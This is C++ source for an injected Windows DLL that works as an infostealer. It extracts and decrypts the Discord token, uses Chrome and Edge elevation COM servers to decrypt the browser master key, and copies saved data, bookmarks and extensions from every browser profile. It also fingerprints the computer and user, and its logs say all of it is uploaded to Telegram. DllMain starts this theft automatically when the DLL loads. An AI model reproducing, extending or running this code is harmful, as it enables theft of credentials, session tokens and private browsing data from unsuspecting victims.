                if (RtlGetVersion) {
                    RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
                    specs << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion 
                          << " Build " << osvi.dwBuildNumber;
                }
            }
            
            return specs.str();
        }

        std::string ExtractDiscordToken()
        {
            try {
                // Try multiple Discord variants
                std::vector<std::string> discordPaths = {
                    "discord",
                    "discordptb", 
                    "discordcanary",
                    "discorddevelopment"
                };

                fs::path roamingPath;
                char appdata[MAX_PATH];
                if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
                    roamingPath = fs::path(appdata);
                } else {
                    return "";
                }

                for (const auto& discordVariant : discordPaths) {
                    fs::path statePath = roamingPath / discordVariant / "Local State";
                    fs::path dbPath = roamingPath / discordVariant / "Local Storage" / "leveldb";

                    m_logger.Log("[*] Checking Discord variant: " + discordVariant);
                    
                    if (!fs::exists(statePath)) {
                        m_logger.Log("[-] Local State not found: " + statePath.string());
                        continue;
                    }
                    
                    if (!fs::exists(dbPath)) {
                        m_logger.Log("[-] LevelDB path not found: " + dbPath.string());
                        continue;
                    }

                    m_logger.Log("[+] Found Discord installation: " + discordVariant);

                    // Get master key
                    std::ifstream f(statePath, std::ios::binary);
                    if (!f.is_open()) {
                        m_logger.Log("[-] Failed to open Local State");
                        continue;
                    }
                    
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    f.close();

                    std::regex key_regex("\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                    std::smatch match;
                    if (!std::regex_search(content, match, key_regex) || match.size() < 2) {
                        m_logger.Log("[-] No encrypted_key found in Local State");
                        continue;
                    }

                    auto encrypted_key_data = Utils::Base64Decode(match[1].str());
                    if (!encrypted_key_data || encrypted_key_data->size() <= 5) {
                        m_logger.Log("[-] Invalid encrypted key data");
                        continue;
                    }

                    // Check for DPAPI prefix
                    if (encrypted_key_data->size() > 5 && 
                        encrypted_key_data->at(0) == 'D' &&
                        encrypted_key_data->at(1) == 'P' &&
                        encrypted_key_data->at(2) == 'A' &&
                        encrypted_key_data->at(3) == 'P' &&
                        encrypted_key_data->at(4) == 'I') {
                        
                        // DPAPI decrypt
                        DATA_BLOB input_blob;
                        input_blob.pbData = const_cast<uint8_t*>(encrypted_key_data->data() + 5);
                        input_blob.cbData = (DWORD)(encrypted_key_data->size() - 5);
                        DATA_BLOB output_blob;
                        std::vector<uint8_t> master_key;
                        
                        if (CryptUnprotectData(&input_blob, nullptr, nullptr, nullptr, nullptr, 0, &output_blob)) {
                            master_key.assign(output_blob.pbData, output_blob.pbData + output_blob.cbData);
                            LocalFree(output_blob.pbData);
                            m_logger.Log("[+] Master key decrypted successfully");
                        } else {
                            m_logger.Log("[-] DPAPI decryption failed");
                            continue;
                        }
                        
                        if (master_key.empty() || master_key.size() != 32) {
                            m_logger.Log("[-] Invalid master key size");
                            continue;
                        }

                        // Scan leveldb files
                        std::regex encPattern(R"(dQw4w9WgXcQ:([A-Za-z0-9+/=]{100,}))");
                        int filesScanned = 0;
                        int tokensFound = 0;
                        
                        for (const auto& entry : fs::directory_iterator(dbPath)) {
                            std::string ext = entry.path().extension().string();
                            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                            
                            if (ext != ".log" && ext != ".ldb") continue;
                            
                            filesScanned++;
                            std::ifstream dbf(entry.path(), std::ios::binary);
                            if (!dbf.is_open()) continue;
                            
                            std::string dbcontent((std::istreambuf_iterator<char>(dbf)), std::istreambuf_iterator<char>());
                            dbf.close();

                            for (std::sregex_iterator it(dbcontent.begin(), dbcontent.end(), encPattern), end_it; it != end_it; ++it) {
                                tokensFound++;
                                std::string full_match = (*it)[0].str();
                                std::string enc_token_b64 = full_match.substr(12); // Skip "dQw4w9WgXcQ:"
                                
                                auto enc_token_data = Utils::Base64Decode(enc_token_b64);
                                if (!enc_token_data || enc_token_data->size() < 31) continue;

                                // Extract IV (12 bytes) and ciphertext+tag
                                std::vector<uint8_t> iv(enc_token_data->begin() + 3, enc_token_data->begin() + 15);
                                std::vector<uint8_t> payload(enc_token_data->begin() + 15, enc_token_data->end());
                                
                                std::string decr_token = AES_GCM_Decrypt(master_key, iv, payload);
                                if (decr_token.length() > 50) {
                                    m_logger.Log("[+] Discord token extracted successfully!");
                                    return decr_token;
                                }
                            }
                        }
                        
                        m_logger.Log("[*] Scanned " + std::to_string(filesScanned) + " files, found " + std::to_string(tokensFound) + " encrypted tokens");
                    }
                }
                
                m_logger.Log("[-] No Discord tokens found in any variant");
            }
            catch (const std::exception& e) {
                m_logger.Log("[-] Exception in ExtractDiscordToken: " + std::string(e.what()));
            }
            catch (...) {
                m_logger.Log("[-] Unknown exception in ExtractDiscordToken");
            }
            return "";
        }

        std::string AES_GCM_Decrypt(const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv, const std::vector<uint8_t>& combined_payload)
        {
            if (combined_payload.size() <= 16 || key.size() != 32 || iv.size() != 12) return "";
            
            std::vector<uint8_t> ciphertext(combined_payload.begin(), combined_payload.end() - 16);
            std::vector<uint8_t> tag(combined_payload.end() - 16, combined_payload.end());

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCRYPT_KEY_HANDLE hKey = nullptr;
            if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) return "";
            if (!NT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return "";
            }
            if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PBYTE)key.data(), (ULONG)key.size(), 0))) {
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return "";
            }

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PBYTE)iv.data();
            authInfo.cbNonce = (ULONG)iv.size();
            authInfo.pbTag = (PBYTE)tag.data();
            authInfo.cbTag = (ULONG)tag.size();

            ULONG decrypted_len = 0;
            std::vector<uint8_t> decrypted_buffer((ULONG)ciphertext.size());
            std::string result;
            if (NT_SUCCESS(BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, decrypted_buffer.data(), (ULONG)decrypted_buffer.size(), &decrypted_len, 0))) {
                result.assign(decrypted_buffer.begin(), decrypted_buffer.begin() + decrypted_len);
            }

            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }
    };

    class BrowserManager
    {
    public:
        BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

        const Browser::Config &getConfig() const
        {
            return m_config;
        }
        const fs::path getUserDataRoot() const
        {
            return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
        }

    private:
        Browser::Config m_config;
    };

    class MasterKeyDecryptor
    {
    public:
        MasterKeyDecryptor(PipeLogger &logger) : m_logger(logger)
        {
            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
            {
                throw std::runtime_error("Failed to initialize COM library.");
            }
            m_comInitialized = true;
            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
        }

        ~MasterKeyDecryptor()
        {
            if (m_comInitialized)
            {
                CoUninitialize();
            }
        }

        std::vector<uint8_t> Decrypt(const Browser::Config &config, const fs::path &localStatePath)
        {
            m_logger.Log("[*] Reading Local State file: " + localStatePath.u8string());

            if (!fs::exists(localStatePath))
            {
                throw std::runtime_error("Local State file not found: " + localStatePath.u8string());
            }

            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
            if (!bstrEncKey)
                throw std::runtime_error("Memory allocation failed for encrypted key");
            auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);

            BSTR bstrPlainKey = nullptr;
            auto bstrPlainGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(nullptr, &SysFreeString);

            HRESULT hr = E_FAIL;
            DWORD comErr = 0;

            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
            if (config.name == "Edge")
            {
                Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (FAILED(hr))
                {
                    std::ostringstream oss;
                    oss << "Failed to create COM instance for Edge. HRESULT: 0x" << std::hex << hr;
                    throw std::runtime_error(oss.str());
                }

                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                if (FAILED(hr))
                {
                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
                }

                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
            else
            {
                Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (FAILED(hr))
                {
                    std::ostringstream oss;
                    oss << "Failed to create COM instance for " << config.name << ". HRESULT: 0x" << std::hex << hr;
                    throw std::runtime_error(oss.str());
                }

                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                if (FAILED(hr))
                {
                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
                }

                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
            bstrPlainGuard.reset(bstrPlainKey);

            if (FAILED(hr))
            {
                std::ostringstream oss;
                oss << "COM DecryptData failed. HRESULT: 0x" << std::hex << hr << " COM Error: 0x" << comErr;
                throw std::runtime_error(oss.str());
            }

            if (!bstrPlainKey)
            {
                throw std::runtime_error("DecryptData returned null key");
            }

            if (SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
            {
                std::ostringstream oss;
                oss << "Decrypted key has wrong size: " << SysStringByteLen(bstrPlainKey) << " (expected " << Crypto::KEY_SIZE << ")";
                throw std::runtime_error(oss.str());
            }

            std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
            memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
            return aesKey;
        }

    private:
        PipeLogger &m_logger;
        bool m_comInitialized = false;
    };

    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(const fs::path &userDataRoot, PipeLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}

        std::vector<fs::path> FindProfiles()
        {
            m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
            std::set<fs::path> uniqueProfilePaths;

            auto isProfileDirectory = [](const fs::path &path)
            {
                for (const auto &dataCfg : Data::GetExtractionConfigs())
                {
                    if (fs::exists(path / dataCfg.dbRelativePath))
                        return true;
                }
                return false;
            };

            if (isProfileDirectory(m_userDataRoot))
            {
                uniqueProfilePaths.insert(m_userDataRoot);
            }

            try
            {
                for (const auto &entry : fs::directory_iterator(m_userDataRoot))
                {
                    if (entry.is_directory() && isProfileDirectory(entry.path()))
                    {
                        uniqueProfilePaths.insert(entry.path());
                    }
                }
            }
            catch (const fs::filesystem_error &ex)
            {
                m_logger.Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
            }

            m_logger.Log("[+] Found " + std::to_string(uniqueProfilePaths.size()) + " profile(s).");
            return std::vector<fs::path>(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
        }

    private:
        fs::path m_userDataRoot;
        PipeLogger &m_logger;
    };

    class DataExtractor
    {
    public:
        DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
                      const fs::path &baseOutputPath, const std::string &browserName,
                      DataUploader &uploader)
            : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName),
              m_uploader(uploader) {}

        void Extract()
        {
            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
            if (!fs::exists(dbPath))
                return;

            // Retry logic for locked databases (Network Service may hold lock briefly)
            fs::path tempPath;
            bool copySuccess = false;
            
            for (int attempt = 0; attempt < 3; attempt++) {
                tempPath = fs::temp_directory_path() / ("chrome_temp_" + std::to_string(GetTickCount64()) + "_" + std::to_string(rand()) + ".db");
                
                try {
                    std::error_code ec;
                    fs::copy_file(dbPath, tempPath, fs::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        copySuccess = true;
                        m_logger.Log("[+] Successfully copied database to temp location (attempt " + std::to_string(attempt + 1) + ")");
                        break;
                    }
                    
                    if (attempt < 2) {
                        m_logger.Log("[-] Copy attempt " + std::to_string(attempt + 1) + " failed: " + ec.message() + " - retrying...");
                        Sleep(1500); // Wait for file locks to release
                    }
                } catch (const std::exception& e) {
                    if (attempt < 2) {
                        m_logger.Log("[-] Exception on attempt " + std::to_string(attempt + 1) + ": " + std::string(e.what()) + " - retrying...");
                        Sleep(1500);
                    }
                }
            }
            
            if (!copySuccess) {
                m_logger.Log("[-] Failed to copy database after 3 attempts - trying direct access (may fail if locked)");
                tempPath = dbPath; // Fall back to direct access
            }

            sqlite3 *db = nullptr;
            std::string uriPath = "file:" + tempPath.string() + "?nolock=1&immutable=1";
            std::replace(uriPath.begin(), uriPath.end(), '\\', '/');

            int openResult = sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr);
            if (openResult != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to open database " + dbPath.u8string() + ": " + (db ? sqlite3_errmsg(db) : "N/A"));
                if (db)
                    sqlite3_close_v2(db);
                if (copySuccess) {
                    try { fs::remove(tempPath); } catch(...) {}
                }
                return;
            }
            
            bool isTempFile = copySuccess;
            auto dbCloser = [tempPath, isTempFile](sqlite3 *d)
            { 
                if (d) sqlite3_close_v2(d);
                if (isTempFile) {
                    try { fs::remove(tempPath); } catch(...) {}
                }
            };
            std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);

            sqlite3_stmt *stmt = nullptr;
            if (sqlite3_prepare_v2(dbGuard.get(), m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
                return;
            auto stmtFinalizer = [](sqlite3_stmt *s)
            { if (s) sqlite3_finalize(s); };
            std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);

            std::any preQueryState;
            if (m_config.preQuerySetup)
            {
                if (auto state = m_config.preQuerySetup(dbGuard.get()))
                {
                    preQueryState = *state;
                }
            }

            std::vector<std::string> jsonEntries;
            while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
            {
                if (auto jsonEntry = m_config.jsonFormatter(stmtGuard.get(), m_aesKey, preQueryState))
                {
                    jsonEntries.push_back(*jsonEntry);
                }
            }

            if (!jsonEntries.empty())
            {
                // Build JSON content
                std::ostringstream jsonContent;
                jsonContent << "[\n";
                for (size_t i = 0; i < jsonEntries.size(); ++i)
                {
                    jsonContent << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
                }
                jsonContent << "\n]\n";

                // Generate filename with identifier
                std::string filename = m_browserName + "_" + m_profilePath.filename().string() + "_" + m_config.outputFileName + ".json";
                
                // Add to webhook batch instead of sending immediately
                m_uploader.AddDataFile(filename, jsonContent.str(), (int)jsonEntries.size());

                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " collected for batch");
            }
        }

    private:
        fs::path m_profilePath;
        const Data::ExtractionConfig &m_config;
        const std::vector<uint8_t> &m_aesKey;
        PipeLogger &m_logger;
        fs::path m_baseOutputPath;
        std::string m_browserName;
        DataUploader &m_uploader;
    };

    class DecryptionOrchestrator
    {
    public:
        DecryptionOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
        {
            if (!m_logger.isValid())
            {
                throw std::runtime_error("Failed to connect to named pipe from injector.");
            }
            ReadPipeParameters();
        }

        void Run()
        {
            BrowserManager browserManager;
            const auto &browserConfig = browserManager.getConfig();
            m_logger.Log("[*] Decryption process started for " + browserConfig.name);

            // Initialize Discord webhook -> Changed to Data Uploader
            DataUploader uploader(m_logger);
            
            // Initialize system info on first browser only
            uploader.InitializeSystemInfo();

            std::vector<uint8_t> aesKey;
            {
                MasterKeyDecryptor keyDecryptor(m_logger);
                fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
                aesKey = keyDecryptor.Decrypt(browserConfig, localStatePath);
            }
            m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));

            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profilePaths = enumerator.FindProfiles();

            int successfulProfiles = 0;
            int failedProfiles = 0;

            for (const auto &profilePath : profilePaths)
            {
                try
                {
                    m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
                    
                    // Extract SQLite-based data
                    for (const auto &dataConfig : Data::GetExtractionConfigs())
                    {
                        DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name, uploader);
                        extractor.Extract();
                    }
                    
                    // Extract Bookmarks (JSON file)
                    try {
                        std::string bookmarksJson = Data::BookmarkExtractor::Extract(profilePath);
                        std::string filename = browserConfig.name + "_" + profilePath.filename().string() + "_bookmarks.json";
                        
                        // Count bookmarks for reporting
                        int count = 0;
                        size_t pos = 0;
                        while ((pos = bookmarksJson.find("\"url\":", pos)) != std::string::npos) {
                            count++;
                            pos++;
                        }
                        
                        uploader.AddDataFile(filename, bookmarksJson, count);
                        m_logger.Log("[+] Extracted " + std::to_string(count) + " bookmarks");
                    } catch (const std::exception &e) {
                        m_logger.Log("[-] Bookmark extraction failed: " + std::string(e.what()));
                    }
                    
                    // Extract Extensions (JSON file)
                    try {
                        std::string extensionsJson = Data::ExtensionExtractor::Extract(profilePath);
                        std::string filename = browserConfig.name + "_" + profilePath.filename().string() + "_extensions.json";
                        
                        // Count extensions
                        int count = 0;
                        size_t pos = 0;
                        while ((pos = extensionsJson.find("\"id\":", pos)) != std::string::npos) {
                            count++;
                            pos++;
                        }
                        
                        uploader.AddDataFile(filename, extensionsJson, count);
                        m_logger.Log("[+] Extracted " + std::to_string(count) + " extensions");
                    } catch (const std::exception &e) {
                        m_logger.Log("[-] Extension extraction failed: " + std::string(e.what()));
                    }
                    
                    successfulProfiles++;
                }
                catch (const std::exception &e)
                {
                    m_logger.Log("[-] Profile " + profilePath.filename().u8string() +
                                 " extraction failed: " + std::string(e.what()) + " (continuing with others)");
                    failedProfiles++;
                    continue;
                }
            }

            m_logger.Log("[*] Extraction complete: " + std::to_string(successfulProfiles) +
                         " successful, " + std::to_string(failedProfiles) + " failed.");

            if (m_extractFingerprint)
            {
                try
                {
                    ExtractBrowserFingerprint(browserManager, browserConfig, uploader);
                }
                catch (const std::exception &e)
                {
                    m_logger.Log("[-] Fingerprint extraction failed: " + std::string(e.what()));
                }
            }

            // Data collected in RAM - will be uploaded later by last browser
            m_logger.Log("[+] Data collection complete for " + browserConfig.name);
            
            // Check if this is the last browser
            char* envBrowserCount = getenv("CHROME_ELEVATOR_BROWSER_COUNT");
            char* envBrowserIndex = getenv("CHROME_ELEVATOR_BROWSER_INDEX");
            
            bool isLastBrowser = false;
            if (envBrowserCount && envBrowserIndex) {
                int totalBrowsers = atoi(envBrowserCount);
                int currentIndex = atoi(envBrowserIndex);
                isLastBrowser = (currentIndex == totalBrowsers);
                m_logger.Log("[*] Browser " + std::to_string(currentIndex) + "/" + std::to_string(totalBrowsers));
            } else {
                // If no env vars, assume single browser - upload immediately
                isLastBrowser = true;
                m_logger.Log("[*] No browser tracking env vars - uploading now");
            }
            
            if (isLastBrowser) {
                m_logger.Log("[*] Last browser reached - triggering upload...");
                if (uploader.UploadAllData(browserConfig.name, true)) {
                    m_logger.Log("[+] Successfully uploaded all data to Telegram!");
                } else {
                    m_logger.Log("[-] Failed to upload data to Telegram");
                }
            } else {
                m_logger.Log("[*] Waiting for remaining browsers before upload...");
            }
        }

        void ExtractBrowserFingerprint(const BrowserManager &browserManager, const Browser::Config &browserConfig, DataUploader &uploader)
        {
            m_logger.Log("[*] Extracting browser fingerprint data...");

            std::ostringstream fingerprint;
            fingerprint << "{\n";
            fingerprint << "  \"browser\": \"" + browserConfig.name + "\",\n";

            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);

            DWORD handle = 0;
            DWORD versionInfoSize = GetFileVersionInfoSizeA(exePath, &handle);
            if (versionInfoSize > 0)
            {
                std::vector<BYTE> versionData(versionInfoSize);
                if (GetFileVersionInfoA(exePath, 0, versionInfoSize, versionData.data()))
                {
                    VS_FIXEDFILEINFO *fileInfo = nullptr;
                    UINT len = 0;
                    if (VerQueryValueA(versionData.data(), "\\", (LPVOID *)&fileInfo, &len))
                    {
                        fingerprint << "  \"browser_version\": \"" << HIWORD(fileInfo->dwFileVersionMS) << "."
                                    << LOWORD(fileInfo->dwFileVersionMS) << "."
                                    << HIWORD(fileInfo->dwFileVersionLS) << "."
                                    << LOWORD(fileInfo->dwFileVersionLS) << "\",\n";
                    }
                }
            }

            fingerprint << "  \"executable_path\": \"" + Utils::EscapeJson(exePath) + "\",\n";

            fingerprint << "  \"user_data_path\": \"" + Utils::EscapeJson(browserManager.getUserDataRoot().u8string()) + "\",\n";

            fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
            if (fs::exists(localStatePath))
            {
                std::ifstream f(localStatePath);
                if (f)
                {
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

                    size_t accountPos = content.find("\"account_info\"");
                    fingerprint << "  \"sync_enabled\": " << (accountPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t enterprisePos = content.find("\"enterprise\"");
                    fingerprint << "  \"enterprise_managed\": " << (enterprisePos != std::string::npos ? "true" : "false") << ",\n";

                    std::string channel = "stable";
                    if (content.find("\"beta\"") != std::string::npos)
                        channel = "beta";
                    else if (content.find("\"dev\"") != std::string::npos)
                        channel = "dev";
                    else if (content.find("\"canary\"") != std::string::npos)
                        channel = "canary";
                    fingerprint << "  \"update_channel\": \"" << channel << "\",\n";

                    size_t searchPos = content.find("\"default_search_provider_data\"");
                    if (searchPos != std::string::npos)
                    {
                        std::string searchProvider = "unknown";
                        if (content.find("\"google\"", searchPos) != std::string::npos)
                            searchProvider = "Google";
                        else if (content.find("\"bing\"", searchPos) != std::string::npos)
                            searchProvider = "Bing";
                        else if (content.find("\"duckduckgo\"", searchPos) != std::string::npos)
                            searchProvider = "DuckDuckGo";
                        fingerprint << "  \"default_search_engine\": \"" << searchProvider << "\",\n";
                    }

                    size_t hwAccelPos = content.find("\"hardware_acceleration_mode_enabled\"");
                    fingerprint << "  \"hardware_acceleration\": " << (hwAccelPos != std::string::npos ? "true" : "false") << ",\n";
                }
            }

            fs::path prefsFile = browserManager.getUserDataRoot() / "Default" / "Preferences";
            if (fs::exists(prefsFile))
            {
                std::ifstream f(prefsFile);
                if (f)
                {
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

                    size_t autofillPos = content.find("\"autofill\"");
                    fingerprint << "  \"autofill_enabled\": " << (autofillPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t pwdMgrPos = content.find("\"credentials_enable_service\"");
                    fingerprint << "  \"password_manager_enabled\": " << (pwdMgrPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t safeBrowsingPos = content.find("\"safebrowsing\"");
                    fingerprint << "  \"safe_browsing_enabled\": " << (safeBrowsingPos != std::string::npos ? "true" : "false") << ",\n";
                }
            }

            fs::path extensionsPath = browserManager.getUserDataRoot() / "Default" / "Extensions";
            int extensionCount = 0;
            std::vector<std::string> extensionIds;

            if (fs::exists(extensionsPath))
            {
                for (const auto &extEntry : fs::directory_iterator(extensionsPath))
                {
                    if (extEntry.is_directory())
                    {
                        extensionCount++;
                        extensionIds.push_back(extEntry.path().filename().string());
                    }
                }
            }
            fingerprint << "  \"installed_extensions_count\": " << extensionCount << ",\n";

            if (!extensionIds.empty())
            {
                fingerprint << "  \"extension_ids\": [";
                for (size_t i = 0; i < extensionIds.size(); ++i)
                {
                    fingerprint << "\"" << extensionIds[i] << "\"";
                    if (i < extensionIds.size() - 1)
                        fingerprint << ", ";
                }
                fingerprint << "],\n";
            }

            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profiles = enumerator.FindProfiles();
            fingerprint << "  \"profile_count\": " << profiles.size() << ",\n";

            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            if (GetComputerNameA(computerName, &size))
            {
                fingerprint << "  \"computer_name\": \"" << computerName << "\",\n";
            }

            char userName[256];
            DWORD userSize = sizeof(userName);
            if (GetUserNameA(userName, &userSize))
            {
                fingerprint << "  \"windows_user\": \"" << userName << "\",\n";
            }

            if (fs::exists(localStatePath))
            {
                auto ftime = fs::last_write_time(localStatePath);
                auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                    ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now());
                auto time = std::chrono::system_clock::to_time_t(sctp);
                fingerprint << "  \"last_config_update\": " << time << ",\n";
            }

            auto now = std::chrono::system_clock::now();
            auto now_time = std::chrono::system_clock::to_time_t(now);
            fingerprint << "  \"extraction_timestamp\": " << now_time << "\n";

            fingerprint << "}";

            // Add fingerprint to batch
            std::string filename = browserConfig.name + "_fingerprint.json";
            uploader.AddDataFile(filename, fingerprint.str(), 1);
            m_logger.Log("[+] Browser fingerprint added to batch");
        }

    private:
        void ReadPipeParameters()
        {
            char buffer[MAX_PATH + 1] = {0};
            DWORD bytesRead = 0;

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_extractFingerprint = (std::string(buffer) == "FINGERPRINT_TRUE");

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_outputPath = buffer;
        }

        PipeLogger m_logger;
        fs::path m_outputPath;
        bool m_extractFingerprint = false;
    };
}

struct ThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromInjector;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    LPCWSTR lpcwstrPipeName = static_cast<LPCWSTR>(lpParam);

    auto params = std::unique_ptr<ThreadParams>(new ThreadParams{});
    auto thread_params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams *>(lpParam));

    try
    {
        Payload::DecryptionOrchestrator orchestrator(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
        orchestrator.Run();
    }
    catch (const std::exception &e)
    {
        try
        {
            Payload::PipeLogger errorLogger(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
            if (errorLogger.isValid())
            {
                errorLogger.Log("[-] CRITICAL DLL ERROR: " + std::string(e.what()));
            }
        }
        catch (...)
        {
            // Failsafe if logging itself fails.
        }
    }

    FreeLibraryAndExitThread(thread_params->hModule_dll, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ThreadParams{hModule, lpReserved};
        if (!params)
            return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
